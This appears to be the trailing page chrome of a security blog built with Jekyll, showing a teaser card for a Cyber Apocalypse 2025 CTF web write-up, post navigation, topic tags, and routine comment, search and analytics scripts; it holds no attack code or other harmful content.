Apocalypse 2025 - 6x Web Challenges Writeup</h3><div class="text-muted small"><p> I participated as a member of team CibersecUNI. This time i managed to solve all 6/6 challenges in the web category. Whispers of the Moonbeam Observando las funciones, nos dan una pista que se pu...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Web-Cache-Poisoning/" class="btn btn-outline-primary" prompt="Older"><p>Web Cache Poisoning Techniques</p></a> <a href="/posts/CyberApocalypse-CTF2025-Web/" class="btn btn-outline-primary" prompt="Newer"><p>Cyber Apocalypse 2025 - 6x Web Challenges Writeup</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "s4yhii/s4yhii.github.io", "data-repo-id": "R_kgDOHtsc-g", "data-category": "Announcements", "data-category-id": "DIC_kwDOHtsc-s4CQh10", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> ¬© 2026 <a href="https://twitter.com/s4yhii">Jesus Lujan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-V0V53P7YVQ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-V0V53P7YVQ'); }); </script>
